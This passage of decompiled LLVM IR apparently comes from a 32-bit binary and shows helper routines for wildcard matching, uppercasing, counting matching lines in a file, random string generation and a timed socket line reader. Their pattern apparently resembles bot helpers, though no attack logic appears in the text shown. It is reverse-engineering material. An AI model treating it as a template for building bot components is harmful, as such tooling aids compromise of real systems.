  %v4_80491391 = ptrtoint i8* %arg1 to i32
  %v2_804913c2 = load i8, i8* %arg1, align 1
  %v4_804913f4 = icmp eq i8 %v2_804913c2, 0
  br i1 %v4_804913f4, label %dec_label_pc_8049149, label %dec_label_pc_8049143

dec_label_pc_8049119:                             ; preds = %dec_label_pc_8049143
  %v2_804911e = mul i32 %stack_var_-8.010, 16
  %v2_8049124 = load i8, i8* %stack_var_4.011, align 1
  %v3_8049124 = zext i8 %v2_8049124 to i32
  %v1_804912a = mul nuw nsw i32 %v3_8049124, 4
  %v2_804912a = add i32 %v1_804912a, ptrtoint (i32* @global_var_805a5c0.29 to i32)
  %v3_804912a = inttoptr i32 %v2_804912a to i32*
  %v4_804912a = load i32, i32* %v3_804912a, align 4
  %v2_8049131 = or i32 %v4_804912a, %v2_804911e
  %v5_8049136 = add i32 %v4_804913912, 1
  %v22_8049136 = inttoptr i32 %v5_8049136 to i8*
  %v2_804913c = load i8, i8* %v22_8049136, align 1
  %v4_804913f = icmp eq i8 %v2_804913c, 0
  br i1 %v4_804913f, label %dec_label_pc_8049149, label %dec_label_pc_8049143

dec_label_pc_8049143:                             ; preds = %dec_label_pc_804910a, %dec_label_pc_8049119
  %v4_804913912 = phi i32 [ %v5_8049136, %dec_label_pc_8049119 ], [ %v4_80491391, %dec_label_pc_804910a ]
  %stack_var_4.011 = phi i8* [ %v22_8049136, %dec_label_pc_8049119 ], [ %arg1, %dec_label_pc_804910a ]
  %stack_var_-8.010 = phi i32 [ %v2_8049131, %dec_label_pc_8049119 ], [ 0, %dec_label_pc_804910a ]
  %v5_8049143 = icmp slt i32 %stack_var_-8.010, 0
  %v1_8049147 = icmp eq i1 %v5_8049143, false
  br i1 %v1_8049147, label %dec_label_pc_8049119, label %dec_label_pc_8049149

dec_label_pc_8049149:                             ; preds = %dec_label_pc_8049119, %dec_label_pc_8049143, %dec_label_pc_804910a
  %stack_var_-8.0.lcssa = phi i32 [ 0, %dec_label_pc_804910a ], [ %v2_8049131, %dec_label_pc_8049119 ], [ %stack_var_-8.010, %dec_label_pc_8049143 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.010, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8049149, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049143, { 1, 0 }
}

define i32 @function_804914e(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804914e:
  %tmp12 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8049151 = load i32, i32* @ebx, align 4
  store i32 %v0_8049151, i32* %stack_var_-8, align 4
  %v4_8049155 = ptrtoint i8* %arg1 to i32
  %v2_8049158 = load i8, i8* %arg1, align 1
  %v12_8049161 = icmp eq i8 %v2_8049158, 42
  br i1 %v12_8049161, label %dec_label_pc_8049189, label %dec_label_pc_8049167

dec_label_pc_8049167:                             ; preds = %dec_label_pc_804914e
  %v12_8049167 = icmp eq i8 %v2_8049158, 63
  br i1 %v12_8049167, label %dec_label_pc_80491dc, label %dec_label_pc_804916d

dec_label_pc_804916d:                             ; preds = %dec_label_pc_8049167
  %v4_804916d = icmp eq i8 %v2_8049158, 0
  br i1 %v4_804916d, label %dec_label_pc_8049178, label %dec_label_pc_8049216

dec_label_pc_8049178:                             ; preds = %dec_label_pc_804916d
  %v2_804917b = load i8, i8* %tmp12, align 1
  %v3_804917b = zext i8 %v2_804917b to i32
  br label %dec_label_pc_804926c

dec_label_pc_8049189:                             ; preds = %dec_label_pc_804914e
  %v1_804918c = add i32 %v4_8049155, 1
  %v4_8049194 = inttoptr i32 %v1_804918c to i8*
  %v5_8049197 = call i32 @function_804914e(i8* %v4_8049194, i32 %arg2)
  %v1_804919c = icmp eq i32 %v5_8049197, 0
  br i1 %v1_804919c, label %dec_label_pc_80491ca, label %dec_label_pc_80491a0

dec_label_pc_80491a0:                             ; preds = %dec_label_pc_8049189
  %v2_80491a3 = load i8, i8* %tmp12, align 1
  %v4_80491a6 = icmp eq i8 %v2_80491a3, 0
  br i1 %v4_80491a6, label %dec_label_pc_80491d1, label %dec_label_pc_80491aa

dec_label_pc_80491aa:                             ; preds = %dec_label_pc_80491a0
  %v1_80491ad = add i32 %arg2, 1
  %v5_80491b8 = call i32 @function_804914e(i8* nonnull %arg1, i32 %v1_80491ad)
  %v1_80491bd = icmp eq i32 %v5_80491b8, 0
  br i1 %v1_80491bd, label %dec_label_pc_80491ca, label %dec_label_pc_80491d1

dec_label_pc_80491ca:                             ; preds = %dec_label_pc_80491aa, %dec_label_pc_8049189
  br label %dec_label_pc_80491d1

dec_label_pc_80491d1:                             ; preds = %dec_label_pc_80491a0, %dec_label_pc_80491aa, %dec_label_pc_80491ca
  %storemerge5 = phi i32 [ 0, %dec_label_pc_80491ca ], [ 1, %dec_label_pc_80491aa ], [ 1, %dec_label_pc_80491a0 ]
  br label %dec_label_pc_804926c

dec_label_pc_80491dc:                             ; preds = %dec_label_pc_8049167
  %v2_80491df = load i8, i8* %tmp12, align 1
  %v4_80491e2 = icmp eq i8 %v2_80491df, 0
  br i1 %v4_80491e2, label %dec_label_pc_804920e, label %dec_label_pc_80491e6

dec_label_pc_80491e6:                             ; preds = %dec_label_pc_80491dc
  %v1_80491e9 = add i32 %arg2, 1
  %v1_80491ed = add i32 %v4_8049155, 1
  %v4_80491f2 = inttoptr i32 %v1_80491ed to i8*
  %v5_80491f5 = call i32 @function_804914e(i8* %v4_80491f2, i32 %v1_80491e9)
  %v1_80491fa = icmp ne i32 %v5_80491f5, 0
  %. = zext i1 %v1_80491fa to i32
  br label %dec_label_pc_804920e

dec_label_pc_804920e:                             ; preds = %dec_label_pc_80491e6, %dec_label_pc_80491dc
  %storemerge4 = phi i32 [ 1, %dec_label_pc_80491dc ], [ %., %dec_label_pc_80491e6 ]
  br label %dec_label_pc_804926c

dec_label_pc_8049216:                             ; preds = %dec_label_pc_804916d
  %v2_8049219 = load i8, i8* %arg1, align 1
  %v3_8049219 = zext i8 %v2_8049219 to i32
  %v2_8049222 = call i32 @function_8050f70(i32 %v3_8049219)
  store i32 %v2_8049222, i32* @ebx, align 4
  %v2_804922c = load i8, i8* %tmp12, align 1
  %v3_804922c = zext i8 %v2_804922c to i32
  %v2_8049235 = call i32 @function_8050f70(i32 %v3_804922c)
  %v0_804923a = load i32, i32* @ebx, align 4
  %v12_804923a = icmp eq i32 %v0_804923a, %v2_8049235
  %v1_804923c = icmp eq i1 %v12_804923a, false
  br i1 %v1_804923c, label %dec_label_pc_8049266, label %dec_label_pc_804923e

dec_label_pc_804923e:                             ; preds = %dec_label_pc_8049216
  %v1_8049241 = add i32 %arg2, 1
  %v1_8049245 = add i32 %v4_8049155, 1
  %v4_804924a = inttoptr i32 %v1_8049245 to i8*
  %v5_804924d = call i32 @function_804914e(i8* %v4_804924a, i32 %v1_8049241)
  %v1_8049252 = icmp ne i32 %v5_804924d, 0
  %.6 = zext i1 %v1_8049252 to i32
  br label %dec_label_pc_8049266

dec_label_pc_8049266:                             ; preds = %dec_label_pc_804923e, %dec_label_pc_8049216
  %storemerge = phi i32 [ 1, %dec_label_pc_8049216 ], [ %.6, %dec_label_pc_804923e ]
  br label %dec_label_pc_804926c

dec_label_pc_804926c:                             ; preds = %dec_label_pc_804920e, %dec_label_pc_80491d1, %dec_label_pc_8049178, %dec_label_pc_8049266
  %stack_var_-24.0 = phi i32 [ %storemerge5, %dec_label_pc_80491d1 ], [ %storemerge4, %dec_label_pc_804920e ], [ %v3_804917b, %dec_label_pc_8049178 ], [ %storemerge, %dec_label_pc_8049266 ]
  %v2_8049272 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049272, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8049158, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804926c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80491d1, { 2, 1, 0 }
}

define i32 @function_8049275(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8049275:
  %v0_8049275 = load i32, i32* @ebp, align 4
  %v1_8049281 = call i32 @function_8052304(i32 %arg1)
  store i32 %v1_8049281, i32* %arg2, align 4
  %v10_8049292 = icmp eq i32 %v1_8049281, -1
  %. = zext i1 %v10_8049292 to i32
  store i32 %v0_8049275, i32* @ebp, align 4
  ret i32 %.
}

define i32 @function_80492ac(i8* %arg1) local_unnamed_addr {
dec_label_pc_80492ac:
  %stack_var_-4 = alloca i32, align 4
  %v0_80492ac = load i32, i32* @ebp, align 4
  store i32 %v0_80492ac, i32* %stack_var_-4, align 4
  %v4_80492cf4 = ptrtoint i8* %arg1 to i32
  %v2_80492d25 = load i8, i8* %arg1, align 1
  %v4_80492d57 = icmp eq i8 %v2_80492d25, 0
  %v1_80492d79 = icmp eq i1 %v4_80492d57, false
  br i1 %v1_80492d79, label %dec_label_pc_80492b4, label %dec_label_pc_80492d9

dec_label_pc_80492b4:                             ; preds = %dec_label_pc_80492ac, %dec_label_pc_80492b4
  %v4_80492cf11 = phi i32 [ %v5_80492cc, %dec_label_pc_80492b4 ], [ %v4_80492cf4, %dec_label_pc_80492ac ]
  %stack_var_4.010 = phi i8* [ %v22_80492cc, %dec_label_pc_80492b4 ], [ %arg1, %dec_label_pc_80492ac ]
  %v2_80492b7 = load i8, i8* %stack_var_4.010, align 1
  %v3_80492b7 = zext i8 %v2_80492b7 to i32
  %v1_80492c0 = call i32 @function_8050f70(i32 %v3_80492b7)
  %v1_80492ca = trunc i32 %v1_80492c0 to i8
  store i8 %v1_80492ca, i8* %stack_var_4.010, align 1
  %v5_80492cc = add i32 %v4_80492cf11, 1
  %v22_80492cc = inttoptr i32 %v5_80492cc to i8*
  %v2_80492d2 = load i8, i8* %v22_80492cc, align 1
  %v4_80492d5 = icmp eq i8 %v2_80492d2, 0
  %v1_80492d7 = icmp eq i1 %v4_80492d5, false
  br i1 %v1_80492d7, label %dec_label_pc_80492b4, label %dec_label_pc_80492cf.dec_label_pc_80492d9_crit_edge

dec_label_pc_80492cf.dec_label_pc_80492d9_crit_edge: ; preds = %dec_label_pc_80492b4
  %v2_80492d9.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80492d9

dec_label_pc_80492d9:                             ; preds = %dec_label_pc_80492cf.dec_label_pc_80492d9_crit_edge, %dec_label_pc_80492ac
  %v2_80492d9 = phi i32 [ %v2_80492d9.pre, %dec_label_pc_80492cf.dec_label_pc_80492d9_crit_edge ], [ %v0_80492ac, %dec_label_pc_80492ac ]
  %v3_80492d2.lcssa.in = phi i8 [ %v2_80492d2, %dec_label_pc_80492cf.dec_label_pc_80492d9_crit_edge ], [ %v2_80492d25, %dec_label_pc_80492ac ]
  %v3_80492d2.lcssa = zext i8 %v3_80492d2.lcssa.in to i32
  store i32 %v2_80492d9, i32* @ebp, align 4
  ret i32 %v3_80492d2.lcssa

; uselistorder directives
  uselistorder i8* %v22_80492cc, { 1, 0 }
  uselistorder i32 %v5_80492cc, { 1, 0 }
  uselistorder i8* %stack_var_4.010, { 1, 0 }
  uselistorder i32 (i32)* @function_8050f70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80492b4, { 1, 0 }
}

define i32 @function_80492db(i32 %arg1) local_unnamed_addr {
dec_label_pc_80492db:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_80492f4 = call i32 @function_8050d0c(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a9c0.30, i32 0, i32 0), i32 0)
  %v2_8049454 = ptrtoint i32* %stack_var_-4112 to i32
  %tmp22 = bitcast i32* %stack_var_-4112 to i8*
  %v5_804946c24 = call i32 @function_804909b(i32 %v2_8049454, i32 4096, i32 %v5_80492f4)
  %v1_804947125 = icmp eq i32 %v5_804946c24, 0
  %v1_804947327 = icmp eq i1 %v1_804947125, false
  br i1 %v1_804947327, label %dec_label_pc_8049301, label %dec_label_pc_8049479

dec_label_pc_8049301:                             ; preds = %dec_label_pc_80492db, %dec_label_pc_8049433
  %v3_804930a = call i32 @function_80492ac(i8* %tmp22)
  %v5_8049320 = call i32 @function_8051f50(i32 %v2_8049454, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a9ce.31, i32 0, i32 0))
  %v12_804932d = icmp eq i32 %v5_8049320, %v2_8049454
  %v1_804932f = icmp eq i1 %v12_804932d, false
  br i1 %v1_804932f, label %dec_label_pc_8049433, label %dec_label_pc_8049335

dec_label_pc_8049335:                             ; preds = %dec_label_pc_8049301
  %tmp23 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_8049346

dec_label_pc_8049343:                             ; preds = %dec_label_pc_804935a, %dec_label_pc_8049350, %dec_label_pc_8049346
  %v5_8049343 = add i32 %v4_8049346, 1
  %v22_8049343 = inttoptr i32 %v5_8049343 to i8*
  br label %dec_label_pc_8049346

dec_label_pc_8049346:                             ; preds = %dec_label_pc_8049335, %dec_label_pc_8049343
  %storemerge4 = phi i8* [ %v22_8049343, %dec_label_pc_8049343 ], [ %tmp23, %dec_label_pc_8049335 ]
  %v4_8049346 = ptrtoint i8* %storemerge4 to i32
  %v2_8049349 = load i8, i8* %storemerge4, align 1
  %v7_804934c = icmp eq i8 %v2_8049349, 32
  br i1 %v7_804934c, label %dec_label_pc_8049343, label %dec_label_pc_8049350

dec_label_pc_8049350:                             ; preds = %dec_label_pc_8049346
  %v2_8049353 = load i8, i8* %storemerge4, align 1
  %v10_8049356 = icmp eq i8 %v2_8049353, 9
  br i1 %v10_8049356, label %dec_label_pc_8049343, label %dec_label_pc_804935a

dec_label_pc_804935a:                             ; preds = %dec_label_pc_8049350
  %v2_804935d = load i8, i8* %storemerge4, align 1
  %v10_8049360 = icmp eq i8 %v2_804935d, 58
  br i1 %v10_8049360, label %dec_label_pc_8049343, label %dec_label_pc_804938b.preheader

dec_label_pc_804938b.preheader:                   ; preds = %dec_label_pc_804935a
  br label %dec_label_pc_804938b

dec_label_pc_8049366:                             ; preds = %dec_label_pc_80493b4, %dec_label_pc_804938b
  %v3_804937d = call i32 @_strlen(i8* %storemerge4)
  %v6_8049384 = add i32 %v4_8049346, %v3_804937d
  %v1_8049387 = add i32 %v6_8049384, -1
  %v1_8049388 = inttoptr i32 %v1_8049387 to i8*
  store i8 0, i8* %v1_8049388, align 1
  br label %dec_label_pc_804938b

dec_label_pc_804938b:                             ; preds = %dec_label_pc_804938b.preheader, %dec_label_pc_8049366
  %v3_80493a2 = call i32 @_strlen(i8* %storemerge4)
  %v6_80493a9 = add i32 %v4_8049346, %v3_80493a2
  %v1_80493ac = add i32 %v6_80493a9, -1
  %v1_80493ad = inttoptr i32 %v1_80493ac to i8*
  %v2_80493ad = load i8, i8* %v1_80493ad, align 1
  %v10_80493b0 = icmp eq i8 %v2_80493ad, 13
  br i1 %v10_80493b0, label %dec_label_pc_8049366, label %dec_label_pc_80493b4

dec_label_pc_80493b4:                             ; preds = %dec_label_pc_804938b
  store i1 false, i1* @df, align 1
  store i32 %v4_8049346, i32* @edi, align 4
  %v3_80493cb = call i32 @_strlen(i8* %storemerge4)
  %v6_80493d2 = add i32 %v4_8049346, %v3_80493cb
  %v1_80493d5 = add i32 %v6_80493d2, -1
  %v1_80493d6 = inttoptr i32 %v1_80493d5 to i8*
  %v2_80493d6 = load i8, i8* %v1_80493d6, align 1
  %v10_80493d9 = icmp eq i8 %v2_80493d6, 10
  br i1 %v10_80493d9, label %dec_label_pc_8049366, label %dec_label_pc_80493dd

dec_label_pc_80493dd:                             ; preds = %dec_label_pc_80493b4
  %v5_80493eb = call i32 @function_8051ebc(i8* %storemerge4, i32 46)
  %v1_80493f0 = icmp eq i32 %v5_80493eb, 0
  br i1 %v1_80493f0, label %dec_label_pc_804940a, label %dec_label_pc_80493f4

dec_label_pc_80493f4:                             ; preds = %dec_label_pc_80493dd
  %v5_8049402 = call i32 @function_8051ebc(i8* %storemerge4, i32 46)
  %v6_8049402 = inttoptr i32 %v5_8049402 to i8*
  store i8 0, i8* %v6_8049402, align 1
  br label %dec_label_pc_804940a

dec_label_pc_804940a:                             ; preds = %dec_label_pc_80493dd, %dec_label_pc_80493f4
  store i32 %v4_8049346, i32* @eax, align 4
  %v4_8049414 = inttoptr i32 %arg1 to i8*
  %v5_8049417 = call i32 @function_8051edc(i8* %v4_8049414, i32 %v4_8049346)
  %v2_8049422 = call i32 @function_8050b60(i32 %v5_80492f4)
  br label %dec_label_pc_804948e

dec_label_pc_8049433:                             ; preds = %dec_label_pc_8049301
  %v6_804944f = call i32 @function_8051e84(i8* %tmp22, i32 0, i32 4096)
  %v5_804946c = call i32 @function_804909b(i32 %v2_8049454, i32 4096, i32 %v5_80492f4)
  %v1_8049471 = icmp eq i32 %v5_804946c, 0
  %v1_8049473 = icmp eq i1 %v1_8049471, false
  br i1 %v1_8049473, label %dec_label_pc_8049301, label %dec_label_pc_8049479

dec_label_pc_8049479:                             ; preds = %dec_label_pc_8049433, %dec_label_pc_80492db
  %v2_804947f = call i32 @function_8050b60(i32 %v5_80492f4)
  br label %dec_label_pc_804948e

dec_label_pc_804948e:                             ; preds = %dec_label_pc_804940a, %dec_label_pc_8049479
  %storemerge = phi i32 [ 1, %dec_label_pc_8049479 ], [ 0, %dec_label_pc_804940a ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049346, { 4, 3, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_8049454, { 3, 0, 2, 1 }
  uselistorder i32 %v5_80492f4, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_804948e, { 1, 0 }
  uselistorder label %dec_label_pc_804940a, { 1, 0 }
  uselistorder label %dec_label_pc_804938b, { 1, 0 }
  uselistorder label %dec_label_pc_8049346, { 1, 0 }
  uselistorder label %dec_label_pc_8049301, { 1, 0 }
}

define i32 @function_804949d() local_unnamed_addr {
dec_label_pc_804949d:
  %stack_var_-4108 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804949d = load i32, i32* @ebp, align 4
  store i32 %v0_804949d, i32* %stack_var_-4, align 4
  %v4_804949d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804949d, i32* @ebp, align 4
  %v5_80494bc = call i32 @function_8050d0c(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a9c0.30, i32 0, i32 0), i32 0)
  %v2_804951a = ptrtoint i32* %stack_var_-4108 to i32
  %tmp10 = bitcast i32* %stack_var_-4108 to i8*
  %v5_804953211 = call i32 @function_804909b(i32 %v2_804951a, i32 4096, i32 %v5_80494bc)
  %v1_804953712 = icmp eq i32 %v5_804953211, 0
  %v1_804953914 = icmp eq i1 %v1_804953712, false
  br i1 %v1_804953914, label %dec_label_pc_80494c6, label %dec_label_pc_804953b

dec_label_pc_80494c6:                             ; preds = %dec_label_pc_804949d, %dec_label_pc_80494f9
  %stack_var_-12.115 = phi i32 [ %stack_var_-12.0, %dec_label_pc_80494f9 ], [ 0, %dec_label_pc_804949d ]
  %v3_80494cf = call i32 @function_80492ac(i8* %tmp10)
  %v5_80494e5 = call i32 @function_8051f50(i32 %v2_804951a, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a9ce.31, i32 0, i32 0))
  %v12_80494f2 = icmp eq i32 %v5_80494e5, %v2_804951a
  %v1_80494f4 = icmp eq i1 %v12_80494f2, false
  br i1 %v1_80494f4, label %dec_label_pc_80494f9, label %dec_label_pc_80494f6

dec_label_pc_80494f6:                             ; preds = %dec_label_pc_80494c6
  %v4_80494f6 = add i32 %stack_var_-12.115, 1
  br label %dec_label_pc_80494f9

dec_label_pc_80494f9:                             ; preds = %dec_label_pc_80494c6, %dec_label_pc_80494f6
  %stack_var_-12.0 = phi i32 [ %stack_var_-12.115, %dec_label_pc_80494c6 ], [ %v4_80494f6, %dec_label_pc_80494f6 ]
  %v6_8049515 = call i32 @function_8051e84(i8* %tmp10, i32 0, i32 4096)
  %v5_8049532 = call i32 @function_804909b(i32 %v2_804951a, i32 4096, i32 %v5_80494bc)
  %v1_8049537 = icmp eq i32 %v5_8049532, 0
  %v1_8049539 = icmp eq i1 %v1_8049537, false
  br i1 %v1_8049539, label %dec_label_pc_80494c6, label %dec_label_pc_804953b

dec_label_pc_804953b:                             ; preds = %dec_label_pc_80494f9, %dec_label_pc_804949d
  %stack_var_-12.1.lcssa = phi i32 [ 0, %dec_label_pc_804949d ], [ %stack_var_-12.0, %dec_label_pc_80494f9 ]
  %v2_8049541 = call i32 @function_8050b60(i32 %v5_80494bc)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %v2_804951a, { 3, 0, 2, 1 }
  uselistorder i32 %v5_80494bc, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_804909b, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80494f9, { 1, 0 }
  uselistorder label %dec_label_pc_80494c6, { 1, 0 }
}

define i32 @function_804954b(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804954b:
  %v5_8049567 = ptrtoint i8* %arg1 to i32
  %v5_80495ad24 = icmp sgt i32 %arg2, 0
  br i1 %v5_80495ad24, label %dec_label_pc_8049562, label %dec_label_pc_80495af

dec_label_pc_8049562:                             ; preds = %dec_label_pc_804954b, %dec_label_pc_8049562
  %storemerge25 = phi i32 [ %v4_80495a4, %dec_label_pc_8049562 ], [ 0, %dec_label_pc_804954b ]
  %v6_8049567 = add i32 %storemerge25, %v5_8049567
  store i32 %v6_8049567, i32* @ebx, align 4
  %v1_804956a = call i32 @function_80482f9(i32 %storemerge25)
  %v2_804957f = udiv i32 %v1_804956a, 26
  %tmp = mul i32 %v2_804957f, -10
  %v2_8049597 = add i32 %v1_804956a, %tmp
  %v14_8049597 = trunc i32 %v2_8049597 to i8
  %v2_80495a0 = add i8 %v14_8049597, 65
  %v2_80495a2 = load i32, i32* @ebx, align 4
  %v3_80495a2 = inttoptr i32 %v2_80495a2 to i8*
  store i8 %v2_80495a0, i8* %v3_80495a2, align 1
  %v4_80495a4 = add nuw nsw i32 %storemerge25, 1
  %exitcond = icmp eq i32 %v4_80495a4, %arg2
  br i1 %exitcond, label %dec_label_pc_80495a7.dec_label_pc_80495af_crit_edge, label %dec_label_pc_8049562

dec_label_pc_80495a7.dec_label_pc_80495af_crit_edge: ; preds = %dec_label_pc_8049562
  br label %dec_label_pc_80495af

dec_label_pc_80495af:                             ; preds = %dec_label_pc_80495a7.dec_label_pc_80495af_crit_edge, %dec_label_pc_804954b
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_80495a7.dec_label_pc_80495af_crit_edge ], [ 0, %dec_label_pc_804954b ]
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_80495a4, { 1, 0 }
  uselistorder i32 %storemerge25, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049562, { 1, 0 }
}

define i32 @function_80495b5(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80495b5:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v4_80495c2 = ptrtoint i8* %arg2 to i32
  %v1_80495ca = and i32 %v4_80495c2, -256
  %v5_80495cc = call i8* @_memset(i8* %arg2, i32 %v1_80495ca, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  %v2_80495ec = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_80495ec, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80495f3 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_8049600 = udiv i32 %arg1, 32
  %v1_8049606 = urem i32 %arg1, 32
  %v0_8049609 = load i32, i32* @ebp, align 4
  %v2_8049609 = mul nuw nsw i32 %v2_8049600, 4
  %v3_8049609 = add nsw i32 %v2_8049609, -164
  %v4_8049609 = add i32 %v3_8049609, %v0_8049609
  %v5_8049609 = inttoptr i32 %v4_8049609 to i32*
  %v6_8049609 = load i32, i32* %v5_8049609, align 4
  %v9_8049609 = shl i32 1, %v1_8049606
  %v12_8049609 = or i32 %v6_8049609, %v9_8049609
  store i32 %v12_8049609, i32* %v5_8049609, align 4
  %v1_8049614 = add i32 %arg1, 1
  %v2_8049615 = ptrtoint i32* %stack_var_-176 to i32
  %v6_804963e = call i32 @function_8050e18(i32 %v1_8049614, i32 %v2_80495ec, i32 0, i32 %v2_80495ec, i32 %v2_8049615)
  %tmp33 = icmp slt i32 %v6_804963e, 1
  %tmp34 = icmp eq i1 %tmp33, false
  br i1 %tmp34, label %dec_label_pc_80496f5, label %dec_label_pc_80496eb.preheader

dec_label_pc_80496eb.preheader:                   ; preds = %dec_label_pc_80495b5
  %v7_80496ef45 = icmp sgt i32 %tmp11, 9
  br i1 %v7_80496ef45, label %dec_label_pc_80496f5, label %dec_label_pc_8049655

dec_label_pc_8049655:                             ; preds = %dec_label_pc_80496eb.preheader, %dec_label_pc_80496e8
  %stack_var_-36.046 = phi i32 [ %v4_80496e8, %dec_label_pc_80496e8 ], [ %tmp11, %dec_label_pc_80496eb.preheader ]
  %v0_8049655 = load i32, i32* @global_var_805e8c0.32, align 64
  %v3_8049665 = call i32 @function_8048c7c(i32 %v0_8049655, i32 ptrtoint ([5 x i8]* @global_var_805a9d7.33 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 %v2_80495ec, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804968f = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v0_80496a5 = load i32, i32* @ebp, align 4
  %v4_80496a5 = add i32 %v3_8049609, %v0_80496a5
  %v5_80496a5 = inttoptr i32 %v4_80496a5 to i32*
  %v6_80496a5 = load i32, i32* %v5_80496a5, align 4
  %v12_80496a5 = or i32 %v6_80496a5, %v9_8049609
  store i32 %v12_80496a5, i32* %v5_80496a5, align 4
  %v6_80496da = call i32 @function_8050e18(i32 %v1_8049614, i32 %v2_80495ec, i32 0, i32 %v2_80495ec, i32 %v2_8049615)
  %tmp35 = icmp slt i32 %v6_80496da, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_80496f5, label %dec_label_pc_80496e8

dec_label_pc_80496e8:                             ; preds = %dec_label_pc_8049655
  %v4_80496e8 = add nsw i32 %stack_var_-36.046, 1
  %v7_80496ef = icmp sgt i32 %stack_var_-36.046, 8
  br i1 %v7_80496ef, label %dec_label_pc_80496f5, label %dec_label_pc_8049655

dec_label_pc_80496f5:                             ; preds = %dec_label_pc_80496eb.preheader, %dec_label_pc_8049655, %dec_label_pc_80496e8, %dec_label_pc_80495b5
  %v2_8049719 = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_804975f

dec_label_pc_8049704:                             ; preds = %dec_label_pc_804975f
  %v0_8049704 = load i32, i32* @global_var_805e8c0.32, align 64
  %v5_8049726 = call i32 @function_8052724(i32 %v0_8049704, i32 %v2_8049719, i32 1, i32 0)
  %v9_804972b = icmp eq i32 %v5_8049726, 1
  br i1 %v9_804972b, label %dec_label_pc_8049742, label %dec_label_pc_8049730

dec_label_pc_8049730:                             ; preds = %dec_label_pc_8049704
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_804977c

dec_label_pc_8049742:                             ; preds = %dec_label_pc_8049704
  %v3_8049742 = load i8, i8* %stack_var_-177, align 1
  %v4_8049749 = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_8049742, i8* %stack_var_-32.0, align 1
  %v5_804974e = add i32 %v4_8049749, 1
  %v22_804974e = inttoptr i32 %v5_804974e to i8*
  %v3_8049751 = load i8, i8* %stack_var_-177, align 1
  %v10_8049758 = icmp eq i8 %v3_8049751, 10
  br i1 %v10_8049758, label %dec_label_pc_804976d, label %dec_label_pc_804975c

dec_label_pc_804975c:                             ; preds = %dec_label_pc_8049742
  %v4_804975c = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_804975f

dec_label_pc_804975f:                             ; preds = %dec_label_pc_80496f5, %dec_label_pc_804975c
  %stack_var_-32.0 = phi i8* [ %arg2, %dec_label_pc_80496f5 ], [ %v22_804974e, %dec_label_pc_804975c ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80496f5 ], [ %v4_804975c, %dec_label_pc_804975c ]
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_80496f5 ], [ %v4_804975f, %dec_label_pc_804975c ]
  %v4_804975f = add i32 %stack_var_12.0, -1
  %v9_804975f = sub i32 0, %stack_var_12.0
  %v10_804975f = and i32 %stack_var_12.0, %v9_804975f
  %v11_804975f = icmp slt i32 %v10_804975f, 0
  %v12_804975f = icmp eq i32 %v4_804975f, 0
  %v13_804975f = icmp slt i32 %v4_804975f, 0
  %v3_8049763 = icmp eq i1 %v13_804975f, %v11_804975f
  %v4_8049763 = icmp eq i1 %v12_804975f, false
  %v5_8049763 = and i1 %v4_8049763, %v3_8049763
  %v4_8049769 = icmp eq i1 %v5_8049763, false
  %v1_804976b = icmp eq i1 %v4_8049769, false
  br i1 %v1_804976b, label %dec_label_pc_8049704, label %dec_label_pc_804976d

